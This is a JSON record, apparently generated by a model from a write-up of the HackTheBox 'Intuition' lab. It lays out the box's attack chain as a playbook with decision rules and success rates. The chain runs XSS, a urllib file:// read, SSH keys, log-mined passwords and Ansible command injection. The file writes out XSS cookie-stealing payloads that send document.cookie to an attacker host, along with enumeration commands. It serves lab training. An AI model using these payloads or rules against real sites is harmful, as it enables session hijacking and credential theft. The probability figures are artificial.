@@ -1,0 +1,965 @@
+{
+  "writeup_id": "Htb_Intuition",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_multi_service_xss_to_lfi",
+    "primary_services": [
+      "http",
+      "ssh",
+      "ftp"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+nginx",
+    "os_family": "linux",
+    "environment_type": "web_application_cluster",
+    "entry_vector": "cross_site_scripting",
+    "privilege_path": "web_user_to_root_via_ansible",
+    "attack_complexity": "hard",
+    "estimated_time": "4-6 hours",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "multiple_subdomains_same_cookie",
+      "flask_session_cookies",
+      "file_compression_service",
+      "python_urllib_exploitation",
+      "ansible_galaxy_abuse"
+    ],
+    "environmental_clues": [
+      "comprezzor_service_branding",
+      "auth_report_dashboard_subdomains",
+      "xz_compression_functionality",
+      "suricata_logging_present",
+      "selenium_grid_infrastructure"
+    ],
+    "similar_scenarios": [
+      "multi_service_web_apps",
+      "flask_based_platforms"
+    ],
+    "unique_aspects": [
+      "document_compression_theme",
+      "cross_subdomain_xss_chaining",
+      "ansible_command_injection",
+      "docker_escape_via_vnc"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Cross-Site Scripting (XSS)",
+        "success_reason": "Bug report form vulnerable to stored XSS with insufficient input validation",
+        "prerequisite_indicators": [
+          "user_input_forms_available",
+          "admin_review_process_exists",
+          "insufficient_input_sanitization"
+        ],
+        "recognition_patterns": [
+          "bug report or feedback forms",
+          "admin dashboard mentions",
+          "user-generated content display",
+          "lack of CSP headers"
+        ],
+        "failure_modes": [
+          "proper_input_sanitization",
+          "content_security_policy_enabled",
+          "no_admin_interaction",
+          "xss_filters_active"
+        ],
+        "environmental_factors": [
+          "flask_application_framework",
+          "shared_cookie_domain",
+          "admin_review_workflow"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "Python urllib Path Traversal",
+        "success_reason": "PDF export functionality vulnerable to file:// scheme exploitation in urllib",
+        "prerequisite_indicators": [
+          "pdf_generation_functionality",
+          "url_parameter_processing",
+          "python_urllib_usage",
+          "insufficient_url_scheme_validation"
+        ],
+        "recognition_patterns": [
+          "export to PDF features",
+          "URL parameters in requests",
+          "file:// scheme acceptance",
+          "python web application"
+        ],
+        "failure_modes": [
+          "url_scheme_whitelist",
+          "proper_input_validation",
+          "sandboxed_pdf_generation",
+          "network_only_schemes"
+        ],
+        "environmental_factors": [
+          "python_flask_application",
+          "pdf_generation_libraries",
+          "file_system_access_permissions"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "20-45 minutes"
+      },
+      {
+        "technique": "Credential Harvesting from Logs",
+        "success_reason": "Suricata IDS logs contained plaintext passwords due to misconfiguration",
+        "prerequisite_indicators": [
+          "ids_ips_systems_present",
+          "log_files_accessible",
+          "password_authentication_logged",
+          "insufficient_log_sanitization"
+        ],
+        "recognition_patterns": [
+          "suricata log files",
+          "authentication attempts logged",
+          "plaintext credentials in logs",
+          "security tool misconfigurations"
+        ],
+        "failure_modes": [
+          "proper_log_sanitization",
+          "credential_filtering",
+          "restricted_log_access",
+          "encrypted_log_storage"
+        ],
+        "environmental_factors": [
+          "network_monitoring_tools",
+          "verbose_logging_configuration",
+          "shared_system_access"
+        ],
+        "success_probability": 0.45,
+        "typical_timeframe": "10-25 minutes"
+      },
+      {
+        "technique": "Ansible Command Injection",
+        "success_reason": "Custom Ansible wrapper binaries lacked proper input sanitization",
+        "prerequisite_indicators": [
+          "custom_automation_tools",
+          "ansible_installation_present",
+          "user_input_to_system_commands",
+          "insufficient_command_validation"
+        ],
+        "recognition_patterns": [
+          "custom ansible wrappers",
+          "automation tool binaries",
+          "command injection vectors",
+          "privileged automation processes"
+        ],
+        "failure_modes": [
+          "proper_input_sanitization",
+          "command_parameterization",
+          "restricted_command_execution",
+          "input_validation_filters"
+        ],
+        "environmental_factors": [
+          "automation_infrastructure",
+          "custom_tooling_development",
+          "privileged_process_execution"
+        ],
+        "success_probability": 0.55,
+        "typical_timeframe": "30-60 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Shared cookie domain configuration",
+        "discovery_method": "HTTP response header analysis",
+        "why_critical": "Enabled session hijacking across subdomains via XSS",
+        "how_to_recognize": [
+          "Set-Cookie with Domain=.domain.tld",
+          "multiple subdomains present",
+          "flask session cookies",
+          "cross-subdomain functionality"
+        ],
+        "follow_up_actions": [
+          "test_xss_in_all_subdomains",
+          "analyze_cookie_contents",
+          "identify_privilege_escalation_paths"
+        ]
+      },
+      {
+        "discovery": "Admin dashboard with PDF export",
+        "discovery_method": "XSS-based session hijacking",
+        "why_critical": "PDF generation vulnerable to file:// scheme exploitation",
+        "how_to_recognize": [
+          "export functionality present",
+          "url parameters in requests",
+          "python web application",
+          "file generation features"
+        ],
+        "follow_up_actions": [
+          "test_file_scheme_urls",
+          "attempt_local_file_inclusion",
+          "enumerate_accessible_files"
+        ]
+      },
+      {
+        "discovery": "FTP credentials in configuration files",
+        "discovery_method": "File read via urllib exploitation",
+        "why_critical": "Provided access to SSH private keys",
+        "how_to_recognize": [
+          "configuration files accessible",
+          "service credentials stored",
+          "ftp service references",
+          "credential reuse patterns"
+        ],
+        "follow_up_actions": [
+          "test_ftp_access",
+          "enumerate_ftp_contents",
+          "search_for_ssh_keys"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "anonymous_user",
+        "escalation_method": "XSS_to_admin_session",
+        "why_possible": "Stored XSS in bug reports with admin review process",
+        "recognition_signs": [
+          "user_input_forms_available",
+          "admin_review_mentioned",
+          "shared_cookie_domain",
+          "insufficient_xss_protection"
+        ],
+        "exploitation_path": "Register → Submit XSS payload → Steal admin session → Access dashboard"
+      },
+      {
+        "privilege_level": "web_user",
+        "escalation_method": "file_read_to_ssh_access",
+        "why_possible": "PDF export vulnerable to file:// scheme, credentials in config files",
+        "recognition_signs": [
+          "pdf_export_functionality",
+          "python_urllib_usage",
+          "configuration_files_readable",
+          "ssh_service_available"
+        ],
+        "exploitation_path": "Admin dashboard → file:// URL → Read configs → FTP access → SSH key"
+      },
+      {
+        "privilege_level": "system_user",
+        "escalation_method": "log_analysis_to_credentials",
+        "why_possible": "Suricata logs contained plaintext passwords",
+        "recognition_signs": [
+          "ids_logs_accessible",
+          "authentication_events_logged",
+          "verbose_logging_enabled",
+          "credential_exposure_in_logs"
+        ],
+        "exploitation_path": "File system access → Suricata logs → Extract passwords → User escalation"
+      },
+      {
+        "privilege_level": "privileged_user",
+        "escalation_method": "ansible_command_injection",
+        "why_possible": "Custom Ansible wrappers lacked input validation",
+        "recognition_signs": [
+          "custom_automation_binaries",
+          "ansible_infrastructure_present",
+          "user_input_to_commands",
+          "privileged_execution_context"
+        ],
+        "exploitation_path": "Custom binaries → Command injection → Ansible Galaxy exploit → Root access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80 open on Linux host with HTTP redirect to comprezzor.htb",
+        "decision": "Enumerate subdomains and analyze web applications",
+        "reasoning": "Single HTTP service suggests web-based attack vector, subdomain enumeration often reveals additional attack surface",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web attacks fail"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if known vulnerabilities found"
+          }
+        ],
+        "success_indicators": [
+          "subdomains_discovered",
+          "different_applications_found",
+          "authentication_mechanisms_identified"
+        ],
+        "next_decision": "analyze_web_application_stack"
+      },
+      {
+        "step": 2,
+        "situation": "Found multiple subdomains: auth, report, dashboard with Flask-based applications",
+        "decision": "Focus on XSS in bug report functionality to escalate privileges",
+        "reasoning": "Bug report systems often lack proper input sanitization and can target admin users",
+        "confidence": 0.85,
+        "prerequisites": [
+          "user_registration_available",
+          "report_submission_functionality"
+        ],
+        "success_indicators": [
+          "xss_payload_executes",
+          "admin_session_captured"
+        ],
+        "failure_fallbacks": [
+          "flask_cookie_manipulation",
+          "file_upload_attacks",
+          "authentication_bypass"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Successfully obtained admin access via XSS",
+        "decision": "Explore admin dashboard for file read vulnerabilities",
+        "reasoning": "Admin dashboards often have privileged file operations that can be abused",
+        "confidence": 0.8,
+        "prerequisites": [
+          "admin_session_active",
+          "dashboard_access_available"
+        ],
+        "success_indicators": [
+          "file_read_functionality_found",
+          "path_traversal_possible"
+        ],
+        "failure_fallbacks": [
+          "command_injection_in_admin_functions",
+          "database_access",
+          "configuration_file_access"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Found file read vulnerability using Python urllib bug in PDF export",
+        "decision": "Use file read to extract FTP credentials and SSH keys",
+        "reasoning": "File read vulnerabilities often lead to credential disclosure in config files",
+        "confidence": 0.75,
+        "prerequisites": [
+          "file_read_confirmed",
+          "pdf_export_functionality"
+        ],
+        "success_indicators": [
+          "credentials_extracted",
+          "ssh_key_obtained",
+          "ftp_access_gained"
+        ],
+        "failure_fallbacks": [
+          "system_file_enumeration",
+          "application_source_code_review"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_xss_succeeds": {
+        "action": "capture_admin_session_and_escalate",
+        "tools": [
+          "burp_collaborator",
+          "custom_xss_payload"
+        ],
+        "next_phase": "admin_dashboard_exploitation"
+      },
+      "if_file_read_succeeds": {
+        "action": "extract_sensitive_files_and_credentials",
+        "targets": [
+          "config_files",
+          "ssh_keys",
+          "application_logs"
+        ],
+        "next_phase": "lateral_movement_via_ssh"
+      },
+      "if_credentials_obtained": {
+        "action": "authenticate_and_enumerate_system",
+        "tools": [
+          "ssh",
+          "ftp_client"
+        ],
+        "purpose": "establish_foothold_for_privilege_escalation"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_xss_in_bug_report_systems",
+        "reasoning": "high_success_rate_and_often_targets_privileged_users",
+        "applicability": "web_applications_with_user_input"
+      },
+      {
+        "rule": "exploit_python_urllib_bugs_in_file_operations",
+        "reasoning": "common_vulnerability_in_pdf_generation_and_file_processing",
+        "applicability": "python_web_applications_with_file_handling"
+      },
+      {
+        "rule": "enumerate_logs_for_credential_disclosure",
+        "reasoning": "misconfigurations_often_log_sensitive_data",
+        "applicability": "after_obtaining_file_read_access"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Cross-Site Scripting (XSS)",
+        "mitre_id": "T1059.007",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "user_input_reflection",
+          "insufficient_input_sanitization"
+        ],
+        "success_indicators": [
+          "javascript_execution_in_browser",
+          "cookie_theft_possible",
+          "session_hijacking_successful"
+        ],
+        "incompatible_with": [
+          "strict_csp_headers",
+          "comprehensive_input_validation",
+          "output_encoding_implemented"
+        ],
+        "confidence_boosters": [
+          "flask_session_cookies_present",
+          "subdomain_cookie_sharing",
+          "bug_report_functionality"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "File Read via Path Traversal",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "file_processing_functionality",
+          "insufficient_path_validation",
+          "python_urllib_usage"
+        ],
+        "success_indicators": [
+          "local_files_accessible",
+          "configuration_files_readable",
+          "credentials_extracted"
+        ],
+        "incompatible_with": [
+          "strict_file_path_validation",
+          "chroot_jail_implemented",
+          "minimal_file_permissions"
+        ],
+        "confidence_boosters": [
+          "pdf_export_functionality",
+          "python_flask_framework",
+          "admin_dashboard_present"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "SSH Key Extraction",
+        "mitre_id": "T1552.004",
+        "required_services": [
+          "ssh",
+          "ftp"
+        ],
+        "required_ports": [
+          22,
+          21
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "ssh_service_running",
+          "private_keys_accessible",
+          "file_read_vulnerability"
+        ],
+        "success_indicators": [
+          "private_key_extracted",
+          "ssh_authentication_successful",
+          "user_shell_obtained"
+        ],
+        "incompatible_with": [
+          "encrypted_private_keys",
+          "strict_file_permissions",
+          "key_based_auth_disabled"
+        ],
+        "confidence_boosters": [
+          "ftp_credentials_found",
+          "home_directory_accessible",
+          "default_ssh_key_locations"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "Log File Analysis",
+        "mitre_id": "T1005",
+        "required_services": [
+          "any"
+        ],
+        "required_ports": [
+          "any"
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "log_files_accessible",
+          "credentials_logged_plaintext",
+          "insufficient_log_sanitization"
+        ],
+        "success_indicators": [
+          "passwords_found_in_logs",
+          "user_credentials_extracted",
+          "privilege_escalation_possible"
+        ],
+        "incompatible_with": [
+          "log_encryption_enabled",
+          "credential_masking_implemented",
+          "restricted_log_access"
+        ],
+        "confidence_boosters": [
+          "suricata_logs_present",
+          "network_monitoring_tools",
+          "verbose_logging_configuration"
+        ],
+        "typical_success_rate": 0.45,
+        "estimated_time": "20-60 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "nginx",
+          "apache"
+        ],
+        "banner_indicators": [
+          "nginx",
+          "apache",
+          "flask"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "flask_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "flask",
+          "python",
+          "session_cookies"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "openssh"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "multi_subdomain_setup": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "subdomain_enumeration",
+          "vhost_routing"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "subdomain_enumeration",
+          "when": "web_service_detected",
+          "reason": "multiple_attack_surfaces_likely"
+        },
+        {
+          "attack": "xss_in_user_input",
+          "when": "flask_application_detected",
+          "reason": "session_hijacking_cross_subdomain"
+        },
+        {
+          "attack": "file_read_via_path_traversal",
+          "when": "file_processing_detected",
+          "reason": "credential_extraction_possible"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "ssh_key_extraction",
+          "when": "file_read_achieved",
+          "reason": "direct_system_access"
+        },
+        {
+          "attack": "log_analysis",
+          "when": "system_access_obtained",
+          "reason": "privilege_escalation_opportunity"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Cross-Site Scripting (XSS) - Cookie Theft",
+        "mitre_id": "T1539",
+        "category": "credential_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "img_tag_xss",
+            "command_template": "<img src=\"http://{attacker_ip}/{filename}.png\" onerror=\"fetch('http://{attacker_ip}/{endpoint}?cookie='+document.cookie)\">",
+            "actual_command": "<img src=\"http://10.10.14.6/description.png\" onerror=\"fetch('http://10.10.14.6/description?cookie='+document.cookie)\">",
+            "output_pattern": "HTTP requests with cookie data in URL parameters",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "vulnerable_input_field",
+          "admin_or_privileged_user_reviews_input",
+          "javascript_execution_enabled"
+        ],
+        "success_indicators": [
+          "http_requests_received_on_listener",
+          "cookie_data_extracted",
+          "elevated_session_cookie_obtained"
+        ],
+        "common_failures": [
+          "input_sanitization_blocks_payload",
+          "content_security_policy_prevents_execution",
+          "no_privileged_user_interaction"
+        ],
+        "follow_up_techniques": [
+          "session_hijacking",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Flask Cookie Manipulation",
+        "mitre_id": "T1550.004",
+        "category": "credential_access",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "flask-unsign",
+            "command_template": "flask-unsign --decode -c {flask_cookie}",
+            "actual_command": "flask-unsign --decode -c eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIkZpbGUgc3VjY2Vzc2Z1bGx5IGNvbXByZXNzZWQhIl19XX0.ZjUSaA.PccYhzFq9agcarIUkTLFvrf3Zcc",
+            "output_pattern": "{'_flashes': [('success', 'message')]}",
+            "effectiveness_rating": 4,
+            "reliability": 0.95
+          },
+          {
+            "name": "base64_decode",
+            "command_template": "echo {base64_cookie} | base64 -d",
+            "actual_command": "echo eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogIjB4ZGYiLCAicm9sZSI6ICJ1c2VyIn18ZWU5YzU5ZTU5ZjEzNDE3N2QyOWY3MTZiNGJlMzBiYjVjMzA2YmIwOWJlYmEwODM0YjdiOTEwNDkwOTBhMDdkNw== | base64 -d",
+            "output_pattern": "{\"user_id\": N, \"username\": \"name\", \"role\": \"role\"}|hash",
+            "effectiveness_rating": 5,
+            "reliability": 1.0
+          }
+        ],
+        "prerequisites": [
+          "flask_application_identified",
+          "session_cookies_accessible",
+          "custom_authentication_mechanism"
+        ],
+        "success_indicators": [
+          "cookie_structure_decoded",
+          "user_role_information_extracted",
+          "authentication_mechanism_understood"
+        ],
+        "common_failures": [
+          "signed_cookies_prevent_tampering",
+          "strong_secret_key_prevents_forgery"
+        ],
+        "follow_up_techniques": [
+          "session_hijacking",
+          "privilege_escalation_via_role_change"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Subdomain Enumeration",
+        "mitre_id": "T1590.001",
+        "category": "reconnaissance",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "ffuf",
+            "command_template": "ffuf -u http://{target_ip} -H \"Host: FUZZ.{domain}\" -w {wordlist} -mc all -ac",
+            "actual_command": "ffuf -u http://10.10.11.15 -H \"Host: FUZZ.comprezzor.htb\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac",
+            "output_pattern": "subdomain [Status: XXX, Size: XXX]",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "target_domain_identified",
+          "http_service_accessible",
+          "virtual_host_routing_in_use"
+        ],
+        "success_indicators": [
+          "additional_subdomains_discovered",
+          "different_response_codes_or_sizes",
+          "expanded_attack_surface"
+        ],
+        "common_failures": [
+          "no_virtual_hosts_configured",
+          "rate_limiting_blocks_requests",
+          "wildcard_dns_responses"
+        ],
+        "follow_up_techniques": [
+          "web_application_enumeration",
+          "vulnerability_assessment_per_subdomain"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "ffuf",
+        "use_case": "subdomain_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "gobuster",
+          "wfuzz",
+          "dirbuster"
+        ],
+        "best_practices": [
+          "use_auto_calibration_with_-ac_flag",
+          "match_all_status_codes_initially",
+          "use_comprehensive_wordlists"
+        ]
+      },
+      {
+        "tool": "flask-unsign",
+        "use_case": "flask_session_analysis",
+        "effectiveness_rating": 4,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "flask_application_testing"
+        ],
+        "alternatives": [
+          "manual_base64_decoding",
+          "custom_python_scripts"
+        ],
+        "best_practices": [
+          "always_decode_cookies_first",
+          "attempt_secret_key_bruteforcing",
+          "understand_cookie_structure_before_manipulation"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "subdomain_discovery_to_xss_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "ffuf -u http://10.10.11.15 -H \"Host: FUZZ.comprezzor.htb\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac",
+            "purpose": "Discover additional subdomains",
+            "expected_output": "auth, report, dashboard subdomains found"
+          },
+          {
+            "step": 2,
+            "command": "echo '10.10.11.15 comprezzor.htb auth.comprezzor.htb report.comprezzor.htb dashboard.comprezzor.htb' >> /etc/hosts",
+            "purpose": "Add discovered domains to hosts file",
+            "expected_output": "DNS resolution configured"
+          },
+          {
+            "step": 3,
+            "command": "Register account on auth.comprezzor.htb",
+            "purpose": "Obtain authenticated session",
+            "expected_output": "Valid user_data cookie obtained"
+          },
+          {
+            "step": 4,
+            "command": "Submit XSS payload: <img src=\"http://ATTACKER_IP/test.png\" onerror=\"fetch('http://ATTACKER_IP/exfil?cookie='+document.cookie)\">",
+            "purpose": "Execute XSS to steal admin cookies",
+            "expected_output": "HTTP requests with elevated privilege cookies"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "20-30 minutes"
+      },
+      {
+        "sequence_name": "flask_cookie_analysis",
+        "steps": [
+          {
+            "step": 1,
+            "command": "flask-unsign --decode -c [session_cookie]",
+            "purpose": "Decode Flask session cookie",
+            "expected_output": "Flash message structure revealed"
+          },
+          {
+            "step": 2,
+            "command": "echo [user_data_cookie] | base64 -d",
+            "purpose": "Decode custom authentication cookie",
+            "expected_output": "JSON user data with role information"
+          },
+          {
+            "step": 3,
+            "command": "Analyze cookie structure for tampering opportunities",
+            "purpose": "Identify privilege escalation vectors",
+            "expected_output": "Understanding of authentication mechanism"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "10-15 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Intuition",
+      "difficulty": "Hard",
+      "os": "Linux Ubuntu 22.04",
+      "platform": "HackTheBox",
+      "release_date": "2024-04-27",
+      "author": "kavigihan",
+      "estimated_time": "4-6 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "high",
+      "skill_level_required": "advanced",
+      "primary_attack_vectors": [
+        "xss",
+        "file_read",
+        "command_injection"
+      ],
+      "key_vulnerabilities": [
+        "cross_site_scripting",
+        "python_urllib_bug",
+        "ansible_galaxy_exploit",
+        "suricata_log_exposure"
+      ],
+      "environment_type": "web_application_multi_service",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "advanced_xss_chaining",
+        "python_security_bugs",
+        "ansible_exploitation",
+        "log_analysis"
+      ],
+      "prerequisite_knowledge": [
+        "web_security",
+        "python_internals",
+        "ansible_basics",
+        "docker_concepts"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "xss_exploitation",
+        "file_disclosure",
+        "privilege_escalation",
+        "container_escape"
+      ],
+      "attack_types": [
+        "credential_access",
+        "privilege_escalation",
+        "lateral_movement",
+        "container_escape"
+      ],
+      "defensive_lessons": [
+        "input_sanitization",
+        "secure_logging",
+        "ansible_hardening",
+        "container_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bolt",
+        "Forge",
+        "Timing"
+      ],
+      "similarity_reasons": [
+        "complex_web_exploitation",
+        "chained_vulnerabilities",
+        "python_security_bugs"
+      ],
+      "unique_aspects": [
+        "ansible_galaxy_exploitation",
+        "selenium_grid_abuse",
+        "suricata_log_mining"
+      ],
+      "difficulty_factors": [
+        "multiple_exploitation_chains",
+        "advanced_web_techniques",
+        "container_escape_knowledge"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T00:07:33.698750",
+    "original_file": "0xdf_writeups/Htb Intuition.md",
+    "content_length": 75974,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
